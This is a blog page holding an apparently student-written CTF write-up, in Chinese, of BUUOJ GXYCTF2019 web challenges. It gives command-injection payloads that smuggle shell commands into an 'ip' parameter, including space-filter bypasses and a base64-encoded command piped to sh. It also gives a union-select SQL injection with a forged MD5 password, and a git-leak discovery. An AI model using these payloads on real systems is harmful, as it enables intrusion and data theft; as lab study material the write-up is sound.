@@ -1,0 +1,742 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="平台地址：https:&#x2F;&#x2F;buuoj.cn&#x2F;     Ping Ping Ping BabySQli 禁止套娃 BabyUpload !在这里插入图片描述   StrongestMind BabysqliV3.0 END">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUOJ-[GXYCTF2019]-WEB-WP">
+<meta property="og:url" content="http://example.com/2020/K4H6SZ/index.html">
+<meta property="og:site_name" content="会下雪的晴天">
+<meta property="og:description" content="平台地址：https:&#x2F;&#x2F;buuoj.cn&#x2F;     Ping Ping Ping BabySQli 禁止套娃 BabyUpload !在这里插入图片描述   StrongestMind BabysqliV3.0 END">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200912163953754.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2020091216431176.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200912164337702.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2020091216472176.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200912165448354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200912170018615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200912191213921.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200912192115422.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200912192218227.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200912193238144.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200912195612924.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200912195759737.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200912200046916.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200912200627568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200912203437269.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200912204932579.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200912210152363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200912213003314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200912212854576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200912213802160.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200913114407999.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200913115323573.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200913131423592.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200913223422570.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200913231557487.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200913231945391.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200916142612185.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200916142737953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200916143102378.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200916143512494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200916143631619.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200916144038324.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200916144147992.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200916144249764.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200916144556253.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200916144803665.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200916144920251.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200916145929588.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200916154646548.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200916195944398.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200916200133402.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200916200702578.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200921161839314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200921174822895.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2020092117591464.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200921180312695.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200921180450793.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200921191259160.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200921193511987.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2020092119551646.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200921195749702.png#pic_center">
+<meta property="article:published_time" content="2020-09-13T15:20:42.000Z">
+<meta property="article:modified_time" content="2020-09-30T01:32:39.788Z">
+<meta property="article:author" content="yq1ng">
+<meta property="article:tag" content="CTF WEB">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20200912163953754.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center">
+
+<link rel="canonical" href="http://example.com/2020/K4H6SZ/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>BUUOJ-[GXYCTF2019]-WEB-WP | 会下雪的晴天</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">会下雪的晴天</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">CTF菜鸡</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/K4H6SZ/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/xiaoxin.jpg">
+      <meta itemprop="name" content="yq1ng">
+      <meta itemprop="description" content="The best way to know your strength is to fight">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="会下雪的晴天">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          BUUOJ-[GXYCTF2019]-WEB-WP
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-09-13 23:20:42" itemprop="dateCreated datePublished" datetime="2020-09-13T23:20:42+08:00">2020-09-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-09-30 09:32:39" itemprop="dateModified" datetime="2020-09-30T09:32:39+08:00">2020-09-30</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">CTF做题记录</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>7.7k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>13 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <blockquote>
+<p>平台地址：<a target="_blank" rel="noopener" href="https://buuoj.cn/">https://buuoj.cn/</a></p>
+</blockquote>
+<!-- TOC -->
+
+<ul>
+<li><a href="#ping-ping-ping">Ping Ping Ping</a></li>
+<li><a href="#babysqli">BabySQli</a></li>
+<li><a href="#%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83">禁止套娃</a></li>
+<li><a href="#babyupload">BabyUpload</a><ul>
+<li><a href="#img-srchttpsimg-blogcsdnimgcn20200916144920251pngx-oss-processimagewatermarktype_zmfuz3pozw5nagvpdgkshadow_10text_ahr0chm6ly9ibg9nlmnzzg4ubmv0l3dlaxhpbl80mzu3odq5mgsize_16color_fffffft_70pic_center-alt%E5%9C%A8%E8%BF%99%E9%87%8C%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87%E6%8F%8F%E8%BF%B0">!在这里插入图片描述</a></li>
+</ul>
+</li>
+<li><a href="#strongestmind">StrongestMind</a></li>
+<li><a href="#babysqliv30">BabysqliV3.0</a></li>
+<li><a href="#end">END</a></li>
+</ul>
+<!-- /TOC -->
+
+<a id="more"></a>
+<hr>
+<h1 id="Ping-Ping-Ping"><a href="#Ping-Ping-Ping" class="headerlink" title="Ping Ping Ping"></a>Ping Ping Ping</h1><blockquote>
+<p>知识点：RCE，空格及过滤的一些基本绕过</p>
+</blockquote>
+<p>提示GET ip，应该是RCE了，ls看看有啥<br><img src="https://img-blog.csdnimg.cn/20200912163953754.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020091216431176.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>尝试cat一下，发现过滤了空格，绕过一下，过滤了flag，哈哈看来不是这么简单啊，读一下源码吧</p>
+<blockquote>
+<p>空格绕过可以用这些字符：<code>&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 $&#123;IFS&#125;、$IFS、$IFS$1 等</code></p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20200912164337702.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020091216472176.png#pic_center" alt="在这里插入图片描述"><br>试了试好像只有<code>$IFS$9</code>可以用，过滤了挺多东西哈，不过解法还是挺多的，说两个常用的<br><img src="https://img-blog.csdnimg.cn/20200912165448354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<ul>
+<li>内联执行<code>?ip=127.0.0.1;cat$IFS$9`ls` </code>这个我也忘了看的那个大佬的wp了，感觉是奇淫技巧，就记下来了<blockquote>
+<p>何为内联？反引号在linux作用是什么?<br>反引号的作用是命令替换，shell可以先执行``中的命令，将输出结果暂时保存，在适当的地方输出。这就是内联</p>
+</blockquote>
+</li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/20200912170018615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<ul>
+<li>拼接字符<code>?ip=127.0.0.1;a=lag;b=f;cat$IFS$b$a.php</code><br>注意，拼接时前面的赋值不能按flag的顺序赋值，如<code>a=f;b=lag</code>等。因为index.php的源码中有这么一句==<code>if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))</code>这一句的意思就是判断有无按flag顺序出现的字符串<br><img src="https://img-blog.csdnimg.cn/20200912191213921.png#pic_center" alt="在这里插入图片描述"></li>
+<li>其他还有将命令进行base64编码，然后在终端里解码（<code>?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code><br>）等等方法</li>
+</ul>
+<hr>
+<h1 id="BabySQli"><a href="#BabySQli" class="headerlink" title="BabySQli"></a>BabySQli</h1><blockquote>
+<p>知识点：md5密码查询的绕过</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20200912192115422.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>进去随手看看了源码（web手打开网站必做的事），发现有个==search.php==，点进去，看着是base家族的，base64解密失败，base32解密再64解密出了sql<br><img src="https://img-blog.csdnimg.cn/20200912192218227.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200912193238144.png#pic_center" alt="在这里插入图片描述"><br>那就是从usrname下手了，查查字段，试了下，user在第二列<br><img src="https://img-blog.csdnimg.cn/20200912195612924.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200912195759737.png#pic_center" alt="在这里插入图片描述"><br>常规注入似乎不得行，看了看<a target="_blank" rel="noopener" href="https://www.cnblogs.com/gaonuoqi/p/12355035.html">大佬的博客</a>发现这题考的是md5绕过，赵总没放提示，绕过md5可以用联合查询生成的虚拟表，将我们联合查询的东西插到结果中去，如下图<br><img src="https://img-blog.csdnimg.cn/20200912200046916.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>这样就能构造payload了<code>name=1&#39; union select 1,&#39;admin&#39;,&#39;202cb962ac59075b964b07152d234b70&#39;#&amp;pw=123</code>,后面的md5值就是123</p>
+<p><img src="https://img-blog.csdnimg.cn/20200912200627568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<hr>
+<h1 id="禁止套娃"><a href="#禁止套娃" class="headerlink" title="禁止套娃"></a>禁止套娃</h1><blockquote>
+<p>知识点：无参RCE，一些函数的绕过，RCE的骚姿势-session</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20200912203437269.png#pic_center" alt="在这里插入图片描述"><br>源码没有东西，bp抓包也看不到啥，上扫描（赵总靶机有频率限制，所以加上了延时0.06S）！存在git泄露哦，嘿嘿嘿<br><img src="https://img-blog.csdnimg.cn/20200912204932579.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200912210152363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>啊这常用的为协议都被ban掉了啊，也是个RCE的题，参考大佬的博客吧。。。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://yanmymickey.github.io/2020/03/16/CTF/%5BGXYCTF2019%5D%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83%20WP/">博客一</a> ，<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangtanzhi/p/12311239.html">博客二</a> ，<a target="_blank" rel="noopener" href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE">博客三</a>，<a target="_blank" rel="noopener" href="https://www.gem-love.com/ctf/530.html?replytocom=5">Y1ng</a><br>配合食用效果更佳，大佬们tql<br><img src="https://img-blog.csdnimg.cn/20200912213003314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="引自：Y#MD%00"></p>
+</blockquote>
